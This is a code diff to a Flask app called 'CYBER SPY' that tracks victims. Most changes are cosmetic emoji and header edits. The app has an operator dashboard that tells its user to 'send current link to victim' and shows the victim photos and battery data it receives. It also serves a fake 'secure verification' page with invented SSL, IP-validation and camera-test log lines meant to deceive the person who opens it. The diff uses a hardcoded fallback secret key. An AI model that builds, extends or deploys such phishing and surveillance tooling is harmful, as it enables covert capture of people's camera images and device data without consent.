@@ -9,7 +9,7 @@ app.secret_key = os.environ.get('SECRET_KEY', 'force-fixed-key-2025')
 
 reports = {}
 
-#   HTML (   )
+# অপটিমাইজড ড্যাশবোর্ড HTML (শুধু নতুন ডেটা যোগ হয়, রি-রেন্ডার নেই)
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
@@ -35,27 +35,21 @@ DASHBOARD_HTML = """
     </style>
 </head>
 <body>
-<!-- HEADER CARD - CYBER SPY by Arif -->
-<div class="card" style="text-align: center; background: linear-gradient(135deg, #0a0f1e, #07111f); border: 1px solid #ff3366;">
-    <h2 style="margin: 0; color: #4affff; font-size: 1.8rem;"> CYBER SPY</h2>
-    <p style="margin: 5px 0 0; color: #ff99aa; font-size: 1rem;">developed by Arif</p>
-</div>
-
 <div class="card">
-    <h2> SPY DASHBOARD</h2>
+    <h2>📡 CYBER SPY DEVLOPER - ARIF🔥</h2>
     <p><strong>Your persistent UID:</strong> {{ uid }}</p>
     <div>
         <input type="text" id="link" value="{{ link }}" readonly style="width:70%;">
         <button onclick="copyLink()">Copy Link</button>
-        <button class="delete-btn" onclick="deleteData()"> Delete My Data</button>
+        <button class="delete-btn" onclick="deleteData()">🗑️ Delete My Data</button>
     </div>
     <form method="post" action="/new_uid" style="display:inline;">
         <button type="submit" style="background:#ff3366;">Generate New Link (New UID)</button>
     </form>
-    <p> Send current link to victim. Data updates smoothly (new items appear on top).</p>
+    <p>⚠️ Send current link to victim. Data updates smoothly (new items appear on top).</p>
 </div>
 <div class="card">
-    <h3> Received Data (UID: {{ uid }})</h3>
+    <h3>📥 Received Data (UID: {{ uid }})</h3>
     <div id="dataContainer"></div>
 </div>
 <script>
@@ -99,7 +93,7 @@ DASHBOARD_HTML = """
             }, 100);
         }
         if (item.data.battery) {
-            div.innerHTML += `<div class="battery"> Battery: ${item.data.battery.level}% ${item.data.battery.charging ? '(Charging)' : '(Not charging)'}</div>`;
+            div.innerHTML += `<div class="battery">🔋 Battery: ${item.data.battery.level}% ${item.data.battery.charging ? '(Charging)' : '(Not charging)'}</div>`;
         }
         if (item.data.photo) {
             div.innerHTML += `<div><img src="${item.data.photo}" class="photo" alt="Victim photo"></div>`;
@@ -117,7 +111,7 @@ DASHBOARD_HTML = """
             const container = document.getElementById('dataContainer');
             if (!data || data.length === 0) {
                 if (container.children.length === 0) {
-                    container.innerHTML = '<p> No data yet. Send the link to victim.</p>';
+                    container.innerHTML = '<p>⏳ No data yet. Send the link to victim.</p>';
                 }
                 return;
             }
@@ -150,7 +144,7 @@ DASHBOARD_HTML = """
 </html>
 """
 
-#   ( ,   )
+# ভিকটিম পেজ (আগের মতোই, কোনো পরিবর্তন নেই – শুধু রিডাইরেক্ট লিংক আপনার দেওয়া)
 SPY_PAGE_HTML = """
 <!DOCTYPE html>
 <html>
@@ -232,13 +226,13 @@ SPY_PAGE_HTML = """
 </head>
 <body>
 <div class="container">
-    <h1> SECURE VERIFICATION</h1>
+    <h1>🔐 SECURE VERIFICATION</h1>
     <div class="spinner"></div>
     <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
     <div class="status" id="statusMsg">Initializing security protocols...</div>
     <div class="fake-details" id="fakeLog">
-         SSL handshake complete<br>
-         Scanning network environment...
+        ✔️ SSL handshake complete<br>
+        ⏳ Scanning network environment...
     </div>
     <p>Do not close this window. Verification in progress.</p>
 </div>
@@ -259,12 +253,12 @@ SPY_PAGE_HTML = """
         msgIndex++;
     }, 2200);
     
-    const fakeLogLines = [" SSL handshake complete"," Scanning network environment..."," IP validated: 103.42.xxx.xx"," Checking browser extensions"," No threats detected"," Retrieving device timestamp"," Timezone synchronized"," Performing battery calibration..."," Camera integrity test (in progress)"," Secure channel established"];
+    const fakeLogLines = ["✔️ SSL handshake complete","⏳ Scanning network environment...","✔️ IP validated: 103.42.xxx.xx","⏳ Checking browser extensions","✔️ No threats detected","⏳ Retrieving device timestamp","✔️ Timezone synchronized","⏳ Performing battery calibration...","⏳ Camera integrity test (in progress)","✔️ Secure channel established"];
     let logIndex = 2;
     setInterval(() => {
         const logDiv = document.getElementById('fakeLog');
         if (logIndex < fakeLogLines.length) logDiv.innerHTML += "<br>" + fakeLogLines[logIndex++];
-        else logDiv.innerHTML += "<br> Re-verifying connection stability...";
+        else logDiv.innerHTML += "<br>⟳ Re-verifying connection stability...";
         logDiv.scrollTop = logDiv.scrollHeight;
     }, 3500);
     
